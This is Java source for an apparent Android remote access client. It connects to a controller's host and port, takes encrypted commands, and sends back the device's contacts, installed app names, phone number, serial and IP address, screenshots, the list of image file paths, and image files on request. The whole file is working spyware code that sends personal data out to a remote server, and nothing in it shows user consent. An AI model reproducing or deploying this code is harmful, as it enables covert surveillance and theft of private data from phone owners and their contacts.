package com.poc.team;


import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.os.RemoteException;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;

import com.poc.team.cipher.CipherAES;
import com.poc.team.cipher.RSAEncryption;
import com.poc.team.messages.Mensaje;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.ConnectException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Locale;

public class Client extends MainActivity {
    protected static final int TGETCONTACT = 1;
    protected static final int RGETCONTACT = 2;
    protected static final int TGETINSTALLEDAPPS = 3;
    protected static final int RGETINSTALLEDAPPS = 4;
    protected static final int TGETINFO = 5;
    protected static final int RGETINFO = 6;
    protected static final int TSENDID = 7;
    protected static final int TGETKEY = 8;
    protected static final int RGETKEY = 9;
    protected static final int TSENDKEY = 10;
    protected static final int TSCREENSHOT = 11;
    protected static final int RSCREENSHOT = 12;
    protected static final int ROK = 13;
    protected static final int RERR = 14;
    protected static final int TLISTIMAGES = 15;
    protected static final int RLISTIMAGES = 16;
    protected static final int TIMAGE = 17;
    protected static final int RIMAGE = 18;
    protected static final int CLIENTID = 0;
    private static final String TAG = "com.team.teampoc";
    View view;
    Socket socket = null;
    InetAddress address;
    OutputStream o;
    InputStream i;
    DataOutputStream outstream = null;
    DataInputStream instream = null;
    Boolean debug = true;
    Context context;
    Timestamp ts;
    CipherAES cipherAes, cipherAesMaster;
    MainLogic mainLogic;
    int sizeScreenshot = 0;

    public Client(String hostname, int port, Context context, MainLogic mainLogic) {
        try {
            // Sin estas dos lineas no se permite crear el socket
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
            System.out.println("IP " + hostname + " " + port);
            address = InetAddress.getByName(hostname);
            socket = new Socket(address, port);
            this.context = context;
            this.mainLogic = mainLogic;
            System.out.println("Cliente arrancado");
            sendId();
            run();
        } catch (ConnectException c) {
            System.out.println("Connection refusd");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void sendId() {
        Mensaje.TSendId tid = new Mensaje.TSendId(CLIENTID);
        System.out.println(tid.toString());
        try {
            o = socket.getOutputStream();
            tid.writeTo(o);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() throws IOException {
        try {
            i = socket.getInputStream();
            for (; ; ) {
                Mensaje request = Mensaje.readMsg(i);
                switch (request.getType()) {
                    case TGETCONTACT:
                        Mensaje.TGetContact contact = (Mensaje.TGetContact) request;
                        if (debug) {
                            System.out.println(contact);
                        }
                        sendContacts(contact);
                        break;
                    case TGETINSTALLEDAPPS:
                        Mensaje.TGetInstalledApps apps = (Mensaje.TGetInstalledApps) request;
                        if (debug) {
                            System.out.println(apps);
                        }
                        sendInstalledApps(apps);
                        break;
                    case TGETINFO:
                        Mensaje.TGetInfo info = (Mensaje.TGetInfo) request;
                        if (debug) {
                            System.out.println(info);
                        }
                        sendInfo(info);
                        break;
                    case TSENDKEY:
                        Mensaje.TSendKey skey = (Mensaje.TSendKey) request;
                        if (debug) {
                            System.out.println(skey);
                        }
                        System.out.println("Msg valid: " + skey.isValid());
                        saveKey(skey);
                        break;
                    case TSCREENSHOT:
                        Mensaje.TScreenshot screenshot = (Mensaje.TScreenshot) request;
                        if (debug) {
                            System.out.println(screenshot);
                        }
                        sendScreenshot(screenshot);
                        break;
                    case TLISTIMAGES:
                        Mensaje.TListImages listImages = (Mensaje.TListImages) request;
                        if (debug) {
                            System.out.println(listImages);
                        }
                        sendListImages(listImages);
                        break;
                    case TIMAGE:
                        Mensaje.TImage image = (Mensaje.TImage) request;
                        if (debug) {
                            System.out.println(image);
                        }
                        sendImage(image);
                        break;
                    default:
                        System.out.println("Mensaje desconocido");
                }
            }
        } catch (IOException e) {
            System.out.println("Cliente desconectado");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            i.close();
            o.close();
        }
    }

    //KEYS
    private void saveKey(Mensaje.TSendKey t) {
        if (t.isValid()) {
            cipherAesMaster = new CipherAES(t.getKeyMaster());
            Mensaje.ROk rOk = new Mensaje.ROk(t, t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(rOk);
                }
                o = socket.getOutputStream();
                rOk.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RErr err = new Mensaje.RErr(t, "TSendKey Message is not valid", t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //CONTACTS
    private void sendContacts(Mensaje.TGetContact t) {
        String[] names;
        String[] numbers;
        int numContacts = 0;
        numContacts = getNumContacts();
        if (numContacts == 0 || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "not found contacts in phone", t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            names = new String[numContacts];
            numbers = new String[numContacts];
            getContacts(names, numbers);
            Mensaje.RGetContact contacts = new Mensaje.RGetContact(t, names, numbers, t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(contacts);
                }
                o = socket.getOutputStream();
                contacts.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private int getNumContacts() {
        int i = 0;
        String[] projeccion = new String[]{ContactsContract.Data._ID, ContactsContract.Data.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE};
        String selectionClause = ContactsContract.Data.MIMETYPE + "='" +
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "' AND "
                + ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String sortOrder = ContactsContract.Data.DISPLAY_NAME + " ASC";
        Cursor c = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                projeccion,
                selectionClause,
                null,
                sortOrder);
        while (c.moveToNext()) {
            i++;
        }
        c.close();
        return i;
    }

    private boolean getContacts(String[] names, String[] numbers) {
        boolean isEmpty = true;
        int i = 0;
        String[] projeccion = new String[]{ContactsContract.Data._ID, ContactsContract.Data.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE};
        String selectionClause = ContactsContract.Data.MIMETYPE + "='" +
                ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE + "' AND "
                + ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String sortOrder = ContactsContract.Data.DISPLAY_NAME + " ASC";
        Cursor c = context.getContentResolver().query(
                ContactsContract.Data.CONTENT_URI,
                projeccion,
                selectionClause,
                null,
                sortOrder);
        while (c.moveToNext()) {
            isEmpty = false;
            System.out.println("Nombre: " + c.getString(1) + " Número: " + c.getString(2));
            names[i] = c.getString(1);
            numbers[i] = c.getString(2);
            i++;
        }
        c.close();
        return isEmpty;
    }

    // INSTALLED APPS
    private void sendInstalledApps(Mensaje.TGetInstalledApps t) {
        String[] appsNames = getInstalledApps();
        if (appsNames.length == 0 || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "not found apps in phone", t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RGetInstalledApps apps = new Mensaje.RGetInstalledApps(t, appsNames, t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(apps);
                }
                o = socket.getOutputStream();
                apps.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private int getNumInstalledApps() {
        int numApps = 0;
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((isSystemPackage(p) == false)) {
                numApps++;
            }
        }
        System.out.println(numApps);
        return numApps;
    }

    private String[] getInstalledApps() {
        int j = 0;
        int numApps = getNumInstalledApps();
        String[] appNames = new String[numApps];
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((isSystemPackage(p) == false)) {
                //Iconos
                //Drawable icon = p.applicationInfo.loadIcon(getPackageManager());
                System.out.println("App: " + p.applicationInfo.loadLabel(context.getPackageManager()).toString());
                appNames[j] = p.applicationInfo.loadLabel(context.getPackageManager()).toString();
                ;
                j++;
            }
        }
        return appNames;
    }

    private boolean isSystemPackage(PackageInfo pkgInfo) {
        return ((pkgInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) ? true : false;
    }

    //SCREENSHOT
    private void sendScreenshot(Mensaje.TScreenshot t) {
        System.out.println("Entramos a sendScreenshot");
        byte[] screenshot = captureScreen();
        System.out.println("Tamaño " + screenshot.length);
        if (screenshot == null || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "can't get screenshot", t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RScreenshot rScreenshot = new Mensaje.RScreenshot(t, screenshot, t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(rScreenshot);
                }
                o = socket.getOutputStream();
                rScreenshot.writeTo(o);
                System.out.println("screenshot enviada");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private ScreenShotDataParcelable createScreenshotFileInSD(String screenshotRawPath, int size) {
        try {
            RandomAccessFile file = new RandomAccessFile(screenshotRawPath, "rw");
            file.setLength(size);
            return new ScreenShotDataParcelable(file.getFD());
        } catch (Exception e) {
            Log.e(TAG, "Exception createScreenshotFileInSD");
            return null;
        }

    }

    private byte[] captureScreen() {
        try {
            ScreenShot screenShot;
            ScreenShotDataParcelable screenshotFD;
            String screenshotFileName = "screenshot.raw";
            String sdCardPath = Environment.getExternalStorageDirectory().getPath();
            String screenshot_raw_path = sdCardPath + "/" + screenshotFileName;
            Log.i(TAG, "Getting screenshot metadata");
            screenShot = mainLogic.serviceConnection.getInterface().getScreenshotData();
            Log.i(TAG, "Capture Screenshot size: " + screenShot.size);
            Log.i(TAG, "Capture Screenshot format: " + screenShot.format);
            Log.i(TAG, "Capture height:" + screenShot.height + " width: " + screenShot.width + " stride:" + screenShot.stride);
            Log.i(TAG, "Capture Screenshot format: " + screenShot.format);
            screenshotFD = createScreenshotFileInSD(screenshot_raw_path, screenShot.size);
            mainLogic.serviceConnection.getInterface().captureScreenshotToFile(screenshotFD, screenShot.size);
            Log.d(TAG, "Screen Capture Done! size:" + screenShot.size);
            File file = new File(screenshot_raw_path);
            sizeScreenshot = (int) file.length();
            System.out.println("Size file " + sizeScreenshot);
            byte[] bytes = new byte[sizeScreenshot];
            int pixelStride = 1;
            int rowStride = screenShot.stride;
            int rowPadding = rowStride - pixelStride * screenShot.width;
            Bitmap originalBitmap = Bitmap.createBitmap(screenShot.width + rowPadding / pixelStride, screenShot.height, Bitmap.Config.ARGB_8888);
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(bytes, 0, bytes.length);
            buf.close();
            originalBitmap.copyPixelsFromBuffer(ByteBuffer.wrap(bytes));
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            originalBitmap.compress(Bitmap.CompressFormat.PNG, 80, out);
            return out.toByteArray();
        } catch (RemoteException e) {
            e.printStackTrace();
            return null;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    // GET INFO
    private void sendInfo(Mensaje.TGetInfo t) {
        String info;
        info = getInfo();
        if (info == null || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "not info in phone", t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RGetInfo mInfo = new Mensaje.RGetInfo(t, info, t.getNonce() + 1, t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(mInfo);
                }
                o = socket.getOutputStream();
                mInfo.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private String getInfo() {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String mPhoneNumber = tMgr.getLine1Number();
        return "OS VERSION: " + System.getProperty("os.version") + "\nDEVICE: " + android.os.Build.DEVICE
                + "\nMODEL: " + android.os.Build.MODEL + "\nSERIAL: " + android.os.Build.SERIAL
                + "\nUSER: " + android.os.Build.USER + "\nLANGUAGE: " + Locale.getDefault().getDisplayLanguage()
                + "\nCOUNTRY: " + context.getResources().getConfiguration().locale.getCountry()
                + "\nIP: " + getIPAddress(true) + "\nPHONE NUMBER: " + getMyNumber();
    }

    private String getMyNumber() {
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tMgr.getLine1Number();
    }

    private static String getIPAddress(boolean useIPv4) {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String sAddr = addr.getHostAddress().toUpperCase();
                        boolean isIPv4 = addr instanceof Inet4Address;
                        if (useIPv4) {
                            if (isIPv4)
                                return sAddr;
                        } else {
                            if (!isIPv4) {
                                int delim = sAddr.indexOf('%');
                                return delim < 0 ? sAddr : sAddr.substring(0, delim);
                            }
                        }
                    }
                }
            }
        } catch (Exception ex) {
        }
        return null;
    }

    //SEND LIST IMAGES
    private void sendListImages(Mensaje.TListImages t) {
        System.out.println("Entramos a sendListImages");
        String [] imagesPath = getPathImages();
        if (imagesPath == null || imagesPath.length == 0 || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "can't get path of images", t.getNonce() + 1,
                    t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RListImages rListImages = new Mensaje.RListImages(t, imagesPath, t.getNonce() + 1,
                    t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(rListImages);
                }
                o = socket.getOutputStream();
                rListImages.writeTo(o);
                System.out.println("Path de Imagenes enviado");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private String[] getPathImages(){
        final String[] columns = { MediaStore.Images.Media.DATA,
                MediaStore.Images.Media._ID };
        final String orderBy = MediaStore.Images.Media._ID;
        Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, columns, null,
                null, orderBy);
        int count = cursor.getCount();
        String[] imagesPath = new String[count];
        for (int i = 0; i < count; i++) {
            cursor.moveToPosition(i);
            int dataColumnIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
            imagesPath[i]= cursor.getString(dataColumnIndex);
            Log.i("PATH", imagesPath[i]);
        }
        return imagesPath;
    }

    //SEND IMAGE
    private void sendImage(Mensaje.TImage t) {
        System.out.println("Entramos a sendImage");
        byte[] image = readImage(t.getImagePath());
        if (image == null  || !t.isValid()) {
            Mensaje.RErr err = new Mensaje.RErr(t, "can't get image", t.getNonce() + 1,
                    t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(err);
                }
                o = socket.getOutputStream();
                err.writeTo(o);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            Mensaje.RImage rImage = new Mensaje.RImage(t, image, t.getNonce() + 1,
                    t.getTimestamp(), cipherAesMaster);
            try {
                if (debug) {
                    System.out.println(rImage);
                }
                o = socket.getOutputStream();
                rImage.writeTo(o);
                System.out.println("Imagen enviada");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private byte[] readImage(String imagePath){
        File file = new File(imagePath);
        BitmapFactory.Options bm = new BitmapFactory.Options();
        Bitmap b = BitmapFactory.decodeFile(file.getAbsolutePath(), bm);
        ByteArrayOutputStream stream = new ByteArrayOutputStream();
        b.compress(Bitmap.CompressFormat.JPEG, 100, stream);
        return stream.toByteArray();
    }
}
